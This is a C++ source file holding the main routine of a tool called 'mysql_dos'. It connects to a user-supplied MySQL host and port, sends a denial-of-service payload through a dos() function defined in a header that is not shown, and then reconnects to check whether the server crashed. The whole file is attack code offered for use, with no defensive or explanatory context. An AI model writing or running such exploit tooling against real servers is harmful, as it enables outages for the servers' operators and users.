#include "hdr.h"

int main(int argc, char* argv[]) {
	if (argc != 3) {
		cout << "Usage:" << endl << "mysql_dos [target] [port]" << endl;
		return 1;
	}

    SOCKET sock = connect_host(argv[1], argv[2]);

    if (sock == -1) {
        cout << "Error starting Winsock." << endl;
        return 0;
    }
    else if (sock == -2) {
        cout << "The target could not be found." << endl;
        return 0;
    }
    else if (sock == -3) {
        cout << "Error connecting to target" << endl;
        return 0;
    }
    else if (sock == -4) {
        cout << "Error connecting to target" << endl;
        return 0;
    }

    dos(sock);
    
    Sleep(5000);
    if (connect_host(argv[1], argv[2]) == 4294967292) {
        cout << "Crashed the target!" << endl;
    }
    else {
        cout << "The target is immune to this exploit" << endl;
    }

    return 1;
}